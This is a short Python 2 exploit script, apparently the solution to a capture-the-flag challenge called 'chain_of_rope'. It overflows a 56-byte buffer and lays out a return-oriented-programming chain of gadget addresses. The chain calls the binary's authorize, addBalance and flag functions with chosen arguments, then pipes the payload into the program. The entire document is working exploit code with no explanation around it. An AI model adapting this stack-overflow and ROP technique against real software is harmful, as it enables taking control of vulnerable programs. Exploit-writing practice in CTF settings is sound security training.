#!/usr/bin/env python
from struct import *
import os

# Find Gadgets
ret = 0x4011aa
pop_ret = 0x4011a9
pop_pop_ret = 0x401400
authorize = 0x401196
addBalance = 0x4011ab
flag = 0x40120c

# Make Choice
buf = "1\n"
buf += "A" * 56

# authorize
buf += pack("<Q", authorize)
buf += pack("<Q", ret)

# addBalance
buf += pack("<Q", addBalance)
buf += pack("<Q", pop_ret)
buf += pack("<Q", 0xdeadbeef)

# flag
buf += pack("<Q", flag)
buf += pack("<Q", pop_pop_ret)
buf += pack("<Q", 0xba5eba11)
buf += pack("<Q", 0xbedabb1e)

# Save
f = open("payload", 'w')
f.write(buf)
print "[*] Saving buffer ..."
print "[*] Written %d bytes to payload" % len(bytes(buf))

os.system("cat payload | ./chain_of_rope")
